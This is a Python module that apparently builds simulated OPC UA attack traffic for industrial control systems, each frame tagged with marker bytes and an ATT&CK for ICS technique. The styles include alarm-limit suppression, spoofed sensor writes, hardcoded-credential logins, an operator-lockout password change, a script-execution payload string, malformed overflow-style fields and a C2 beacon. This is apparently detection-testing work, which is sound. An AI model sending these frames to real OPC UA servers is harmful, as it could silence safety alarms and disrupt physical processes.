# ICSForge OPC UA payload builder — upgraded for ATT&CK realism
# Implements real OPC UA Secure Conversation headers with distinct service types
import random
import struct

from .common import marker_bytes

# OPC UA Service node IDs (numeric)
SVC = {
    "GetEndpoints":        428,   # discovery
    "FindServers":         420,
    "Browse":              527,   # T0861 Point & Tag Identification
    "BrowseNext":          533,
    "Read":                631,   # T0801 Monitor Process State
    "Write":               673,   # T0831/T0836/T0855
    "Call":                710,   # T0871 Execution through API
    "CreateSession":       461,   # T0822 External Remote Services
    "ActivateSession":     467,   # T0859 Valid Accounts
    "CloseSession":        473,   # T0826 connection cleanup
    "CreateSubscription":  787,   # T0802 Automated Collection
    "Publish":             823,   # T0801 polling
    "HistoryRead":         664,   # T0879 Data Historian Compromise
    "DeleteSubscriptions": 847,   # T0815 Denial of View (kill subscription)
    "TranslateBrowsePaths":554,   # T0861 path-based tag discovery
}

# Message types
MSG_HEL = b"HEL"
MSG_ACK = b"ACK"
MSG_ERR = b"ERR"
MSG_OPN = b"OPN"
MSG_CLO = b"CLO"
MSG_MSG = b"MSG"


def _opc_header(msg_type: bytes, chunk: bytes = b"F", body: bytes = b"") -> bytes:
    """OPC UA Message Header: type(3) + chunk(1) + length(4)."""
    total = 8 + len(body)
    return msg_type + chunk + struct.pack("<I", total) + body


def _node_id(svc_id: int) -> bytes:
    """Encode a numeric NodeId for service request (4-byte encoding)."""
    # NodeId encoding type 0x01 = two-byte numeric, 0x02 = four-byte
    if svc_id <= 0xFF:
        return struct.pack("<BH", 0x01, svc_id)
    else:
        return struct.pack("<BI", 0x02, svc_id)


def _request_header(req_handle: int = 1) -> bytes:
    """Minimal OPC UA RequestHeader (timestamp + handle + diag + audit)."""
    timestamp = 132_800_000_000_000_000  # arbitrary DateTime
    return struct.pack("<qIIIBI",
        timestamp,
        req_handle,  # requestHandle
        0,           # returnDiagnostics
        0,           # auditEntryId (null string = 0xFFFFFFFF)
        0,           # timeoutHint = 0
        0xFFFFFFFF,  # additionalHeader (null extension object)
    )[:28]  # fixed 28 bytes for simplified header



def _parse_node_numeric(val, default=None) -> int:
    """Parse a NodeId value that may be 'ns=2;i=1001', '1001', or an int."""
    if val is None:
        return default if default is not None else random.randint(1000, 9999)
    if isinstance(val, int):
        return val
    s = str(val).strip()
    # "ns=X;i=NNN" or "i=NNN"
    if "i=" in s:
        try:
            return int(s.split("i=")[-1])
        except (ValueError, IndexError):
            pass
    # plain integer string
    try:
        return int(s)
    except ValueError:
        return default if default is not None else random.randint(1000, 9999)

def build_payload(marker: str, style: str = "hello", **kwargs) -> bytes:
    """
    Build OPC UA TCP frame.

    Styles:
      hello              HEL — T0883 initial probe / T0840 Discovery
      get_endpoints      MSG GetEndpointsRequest — T0840/T0888
      find_servers       MSG FindServersRequest — T0888 Remote System Info
      open_session       OPN + CreateSessionRequest — T0822 External Remote Services
      activate_session   MSG ActivateSessionRequest — T0859 Valid Accounts
      close_session      CLO CloseSessionRequest — T0826
      browse             MSG BrowseRequest — T0861 Point & Tag Identification
      browse_next        MSG BrowseNextRequest — T0861 continuation
      translate_paths    MSG TranslateBrowsePathsRequest — T0861
      read_value         MSG ReadRequest — T0801 Monitor Process State
      read_history       MSG HistoryReadRequest — T0879 Data Historian
      write_value        MSG WriteRequest — T0831/T0836/T0855
      call_method        MSG CallRequest — T0871 Execution through API
      create_sub         MSG CreateSubscriptionRequest — T0802
      publish            MSG PublishRequest — T0801 subscription polling
      delete_sub         MSG DeleteSubscriptionsRequest — T0815 Denial of View
    """
    rnd     = random.Random(kwargs.get("seed"))
    sc_id   = int(kwargs.get("secure_channel_id", rnd.randint(1, 0xFFFFFF)))
    token   = int(kwargs.get("security_token",    rnd.randint(1, 0xFFFFFF)))
    seq     = int(kwargs.get("sequence_number",   rnd.randint(1, 0xFFFFFF)))
    req_id  = int(kwargs.get("request_id",        rnd.randint(1, 0xFFFF)))
    mb      = marker_bytes(marker)

    def _sym_header() -> bytes:
        """Symmetric security header (no security)."""
        return struct.pack("<II", sc_id, token)

    def _seq_header() -> bytes:
        """Sequence header."""
        return struct.pack("<II", seq, req_id)

    def _msg_body(svc_id: int, svc_payload: bytes = b"") -> bytes:
        return _sym_header() + _seq_header() + _node_id(svc_id) + _request_header() + svc_payload

    if style == "hello":
        dst = kwargs.get("dst_ip", "10.0.0.1")
        endpoint = kwargs.get("endpoint", f"opc.tcp://{dst}:4840").encode()
        # OPC UA HEL: version(4)+recv_buf(4)+send_buf(4)+max_msg_size(4)+max_chunk_count(4)
        # then endpoint_url as UA_String: length(4, int32) + bytes
        body = struct.pack("<IIIII", 0, 65536, 65536, 0, 0) + \
               struct.pack("<I", len(endpoint)) + endpoint + mb
        return _opc_header(MSG_HEL, b"F", body)

    elif style == "get_endpoints":
        dst    = kwargs.get("dst_ip", "10.0.0.1")
        ep_url = kwargs.get("endpoint", f"opc.tcp://{dst}:4840").encode()
        payload = struct.pack("<I", len(ep_url)) + ep_url + mb
        body    = _msg_body(SVC["GetEndpoints"], payload)
        return _opc_header(MSG_MSG, b"F", body)

    elif style == "find_servers":
        ep_url  = kwargs.get("endpoint", "opc.tcp://10.0.0.1:4840").encode()
        payload = struct.pack("<I", len(ep_url)) + ep_url + mb
        body    = _msg_body(SVC["FindServers"], payload)
        return _opc_header(MSG_MSG, b"F", body)

    elif style == "open_session":
        # OPN (OpenSecureChannel) message layout per OPC UA spec Part 6 §7.1.2:
        #   MessageHeader(8)                     ← emitted by _opc_header
        #   SecureChannelId(4)                   ← 0xFFFFFFFF = new channel
        #   AsymmetricAlgorithmSecurityHeader:
        #     SecurityPolicyUri.Length(4) = -1   ← null string (no security)
        #     SenderCertificate.Length(4)  = -1  ← null ByteString
        #     RecvCertThumbprint.Length(4) = -1  ← null ByteString
        #   SequenceHeader(8): seq(4) + reqId(4)
        #   Service payload: OpenSecureChannelRequest encoded
        # Historical bug: we emitted SecureChannelId AFTER asym_hdr and also
        # packed two stray zero uint32s, which produced a malformed frame
        # that Wireshark's OPC UA dissector flagged at the ReceiverCert
        # thumbprint field. Now fixed to spec order.
        ep_url    = kwargs.get("endpoint", "opc.tcp://10.0.0.1:4840").encode()
        sess_name = b"ICSForge-Session"
        nonce     = bytes([rnd.randint(0, 255) for _ in range(32)])
        svc_payload = _node_id(SVC["CreateSession"]) + _request_header() + \
                      struct.pack("<I", len(ep_url)) + ep_url + \
                      struct.pack("<I", len(sess_name)) + sess_name + \
                      struct.pack("<I", len(nonce)) + nonce + mb
        # OPN-specific body: sc_id + asym_hdr(nulls) + seq_header + service payload
        opn_body = (
            struct.pack("<I", 0xFFFFFFFF) +                  # SecureChannelId = new
            struct.pack("<III", 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF) +  # null asym_hdr
            _seq_header() +
            svc_payload
        )
        return _opc_header(MSG_OPN, b"F", opn_body)

    elif style == "activate_session":
        # ActivateSession — credential presentation (T0859)
        # Anonymous identity token
        token_data = struct.pack("<I", 0)  # null policy id
        payload    = token_data + mb
        body       = _msg_body(SVC["ActivateSession"], payload)
        return _opc_header(MSG_MSG, b"F", body)

    elif style == "close_session":
        body = _opc_header(MSG_CLO, b"F", _sym_header() + _seq_header() +
                           _node_id(SVC["CloseSession"]) + _request_header() + mb)
        return body

    elif style == "browse":
        # BrowseRequest with root node (Objects folder = ns=0;i=85)
        root_node = struct.pack("<BBI", 0x01, 0, 85)  # NodeId
        browse_desc = root_node + struct.pack("<IB", 0, 0xFF)  # browseDirection=Forward, nodeClass=all
        payload = struct.pack("<I", len(browse_desc)) + browse_desc + mb
        body    = _msg_body(SVC["Browse"], payload)
        return _opc_header(MSG_MSG, b"F", body)

    elif style == "browse_next":
        # BrowseNextRequest — continuation browsing (T0861)
        cont_point = bytes([rnd.randint(0, 255) for _ in range(20)])
        payload = struct.pack("<B", 0) + struct.pack("<I", len(cont_point)) + cont_point + mb
        body    = _msg_body(SVC["BrowseNext"], payload)
        return _opc_header(MSG_MSG, b"F", body)

    elif style == "translate_paths":
        # TranslateBrowsePathsToNodeIds — tag path discovery (T0861)
        path_str = kwargs.get("path", "/0:Objects/2:PLCProgram").encode()
        payload  = struct.pack("<I", len(path_str)) + path_str + mb
        body     = _msg_body(SVC["TranslateBrowsePaths"], payload)
        return _opc_header(MSG_MSG, b"F", body)

    elif style == "read_value":
        # ReadRequest — T0801 Monitor Process State
        # ReadValueId: nodeId + attributeId(Value=13)
        node_id = struct.pack("<BBI", 0x01, 0, _parse_node_numeric(kwargs.get("node_id"), rnd.randint(1000, 9999)))
        attr_id = struct.pack("<I", 13)  # Value attribute
        payload = struct.pack("<I", 1) + node_id + attr_id + mb  # count=1
        body    = _msg_body(SVC["Read"], payload)
        return _opc_header(MSG_MSG, b"F", body)

    elif style == "read_history":
        # HistoryReadRequest — T0879 Data Historian Compromise
        node_id  = struct.pack("<BBI", 0x01, 0, _parse_node_numeric(kwargs.get("node_id"), rnd.randint(1000, 9999)))
        # HistoryReadDetails: ReadRawModifiedDetails (start/end time)
        start_ts = struct.pack("<q", 132_700_000_000_000_000)
        end_ts   = struct.pack("<q", 132_800_000_000_000_000)
        payload  = start_ts + end_ts + struct.pack("<I", 100) + node_id + mb  # max 100 values
        body     = _msg_body(SVC["HistoryRead"], payload)
        return _opc_header(MSG_MSG, b"F", body)

    elif style == "write_value":
        # WriteRequest — T0831/T0836/T0855
        node_id  = struct.pack("<BBI", 0x01, 0, _parse_node_numeric(kwargs.get("node_id"), rnd.randint(1000, 9999)))
        attr_id  = struct.pack("<I", 13)  # Value
        value    = struct.pack("<f", float(kwargs.get("value", rnd.uniform(0.0, 100.0))))
        payload  = struct.pack("<I", 1) + node_id + attr_id + value + mb
        body     = _msg_body(SVC["Write"], payload)
        return _opc_header(MSG_MSG, b"F", body)

    elif style == "call_method":
        # CallRequest — T0871 Execution through API
        obj_id   = struct.pack("<BBI", 0x01, 0, _parse_node_numeric(kwargs.get("object_id"), 85))
        meth_id  = struct.pack("<BBI", 0x01, 0, _parse_node_numeric(kwargs.get("method_id"), rnd.randint(1000, 9999)))
        payload  = struct.pack("<I", 1) + obj_id + meth_id + mb
        body     = _msg_body(SVC["Call"], payload)
        return _opc_header(MSG_MSG, b"F", body)

    elif style == "create_sub":
        # CreateSubscriptionRequest — T0802 Automated Collection
        interval  = struct.pack("<d", float(kwargs.get("interval_ms", 500.0)))
        lifetime  = struct.pack("<I", 10000)
        max_keep  = struct.pack("<I", 10)
        payload   = interval + lifetime + max_keep + mb
        body      = _msg_body(SVC["CreateSubscription"], payload)
        return _opc_header(MSG_MSG, b"F", body)

    elif style == "publish":
        # Publish — T0801 subscription data poll
        payload = mb
        body    = _msg_body(SVC["Publish"], payload)
        return _opc_header(MSG_MSG, b"F", body)

    elif style == "delete_sub":
        # DeleteSubscriptions — T0815 Denial of View
        sub_id  = struct.pack("<I", rnd.randint(1, 0xFFFF))
        payload = struct.pack("<I", 1) + sub_id + mb
        body    = _msg_body(SVC["DeleteSubscriptions"], payload)
        return _opc_header(MSG_MSG, b"F", body)

    elif style == "history_read":
        # HistoryReadRequest — T0811 Data from Information Repositories
        # Reads historical process data from OPC UA historian
        node_id  = struct.pack("<BH", 0x01, rnd.randint(1000, 9999))  # numeric node
        payload  = node_id + struct.pack("<I", 10) + mb  # read 10 historical values
        body     = _msg_body(SVC["HistoryRead"], payload)
        return _opc_header(MSG_MSG, b"F", body)

    elif style == "activate_default":
        # ActivateSessionRequest with vendor default credentials — T0812 Default Credentials
        # Many OPC UA servers default to anonymous or guest/guest
        identity = b"anonymous\x00"  # anonymous identity token
        payload  = struct.pack("<I", len(identity)) + identity + mb
        body     = _msg_body(SVC["ActivateSession"], payload)
        return _opc_header(MSG_MSG, b"F", body)

    elif style == "activate_hardcoded":
        # ActivateSessionRequest with known hardcoded vendor credential — T0891 Hardcoded Credentials
        # e.g. "opcua_admin" with empty password — shipped in Kepware, ICONICS
        user    = b"opcua_admin"
        passwd  = b""
        payload = struct.pack("<I", len(user)) + user + struct.pack("<I", len(passwd)) + passwd + mb
        body    = _msg_body(SVC["ActivateSession"], payload)
        return _opc_header(MSG_MSG, b"F", body)

    elif style == "call_script":
        # CallRequest with script argument — T0853 Scripting
        # OPC UA method call with VBScript/Python argument in method params
        method  = struct.pack("<BH", 0x01, rnd.randint(100, 200))
        script  = b"exec(open('/tmp/payload.py').read())"
        payload = method + struct.pack("<I", len(script)) + script + mb
        body    = _msg_body(SVC["Call"], payload)
        return _opc_header(MSG_MSG, b"F", body)

    elif style == "file_read":
        # ReadRequest targeting file-type node — T0893 Data from Local System
        # OPC UA file nodes (FileType, UA Part 5) expose local filesystem
        node_id = struct.pack("<BH", 0x01, rnd.randint(5000, 6000))
        payload = node_id + struct.pack("<HH", 13, 0) + mb  # AttributeId 13 = Value
        body    = _msg_body(SVC["Read"], payload)
        return _opc_header(MSG_MSG, b"F", body)

    elif style == "change_password":
        # ActivateSession with new credential (password change) — T0892 Change Credential
        user    = b"admin"
        passwd  = b"ICSFORGE_LOCKED"  # new password locking out operators
        payload = struct.pack("<I", len(user)) + user + struct.pack("<I", len(passwd)) + passwd + mb
        body    = _msg_body(SVC["ActivateSession"], payload)
        return _opc_header(MSG_MSG, b"F", body)

    elif style == "write_large_blob":
        # WriteRequest with large binary value — T0867 Lateral Tool Transfer
        # Encodes tool payload inside OPC UA byte-string write to file node
        blob    = bytes([rnd.randint(0x20, 0x7E) for _ in range(200)])
        node_id = struct.pack("<BH", 0x01, rnd.randint(5000, 6000))
        payload = node_id + struct.pack("<I", len(blob)) + blob + mb
        body    = _msg_body(SVC["Write"], payload)
        return _opc_header(MSG_MSG, b"F", body)

    elif style == "malformed_browse":
        # BrowseRequest with excessive depth / malformed path — T0866/T0819 Exploitation
        # Crafts path depth that may trigger buffer overflow in vulnerable UA servers
        bad_path = b"\xFF" * 64  # deeply nested path identifier
        payload  = struct.pack("<I", 0xFFFFFFFF) + bad_path + mb  # maxRefs = max
        body     = _msg_body(SVC["Browse"], payload)
        return _opc_header(MSG_MSG, b"F", body)

    elif style == "relay_session":
        # CreateSession to intermediate proxy node — T0884 Connection Proxy
        # Observable as session creation from an unexpected relay IP
        endpoint_url = b"opc.tcp://relay.internal:4840"
        payload      = struct.pack("<I", len(endpoint_url)) + endpoint_url + mb
        body         = _msg_body(SVC["CreateSession"], payload)
        return _opc_header(MSG_OPN, b"F", body)

    elif style == "write_alarm_node":
        # WriteRequest to known alarm limit node — T0838 Modify Alarm Settings
        # Writes extreme value to HighHighLimit node (standard alarm UA node)
        import struct as _s
        node_id = struct.pack("<BH", 0x01, rnd.randint(2000, 3000))
        value   = _s.pack("<d", 1.0e38)  # IEEE 754 near-infinity = alarm never fires
        payload = node_id + struct.pack("<I", len(value)) + value + mb
        body    = _msg_body(SVC["Write"], payload)
        return _opc_header(MSG_MSG, b"F", body)

    elif style == "spoof_value":
        # WriteRequest injecting false sensor value — T0856 Spoof Reporting Message
        node_id = struct.pack("<BH", 0x01, rnd.randint(1000, 2000))
        import struct as _s
        value   = _s.pack("<f", float(kwargs.get("value", rnd.uniform(50.0, 200.0))))
        payload = node_id + struct.pack("<I", len(value)) + value + mb
        body    = _msg_body(SVC["Write"], payload)
        return _opc_header(MSG_MSG, b"F", body)

    elif style == "c2_write":
        # WriteRequest to custom node as covert C2 channel — T0869 Standard App Layer Protocol
        # Legitimate OPC UA port/protocol carrying C2 beacon data
        node_id = struct.pack("<BH", 0x01, rnd.randint(9900, 9999))
        beacon  = struct.pack("<I", rnd.randint(0xDEAD0000, 0xDEADFFFF))  # encoded C2 signal
        payload = node_id + struct.pack("<I", len(beacon)) + beacon + mb
        body    = _msg_body(SVC["Write"], payload)
        return _opc_header(MSG_MSG, b"F", body)

    elif style == "native_raw":
        # Raw OPC UA secure channel open without full session negotiation — T0834 Native API
        # Accesses protocol at SDK level, bypassing normal session layer
        body = struct.pack("<IIII", 0, 0, 3600000, 1) + mb  # minimal OPN body
        return _opc_header(MSG_OPN, b"F", body)

    elif style == "privilege_escalate":
        # ActivateSession with malformed identity token to escalate privilege — T0890
        # Oversized identity token triggering exception in auth parser
        bad_token = b"\xFF" * 48  # malformed token
        payload   = struct.pack("<I", len(bad_token)) + bad_token + mb
        body      = _msg_body(SVC["ActivateSession"], payload)
        return _opc_header(MSG_MSG, b"F", body)

    else:
        # Fallback: hello
        endpoint = b"opc.tcp://10.0.0.1:4840"
        body     = struct.pack("<IIIII", 0, 65536, 65536, 0, 0) + \
                   struct.pack("<I", len(endpoint)) + endpoint + mb
        return _opc_header(MSG_HEL, b"F", body)
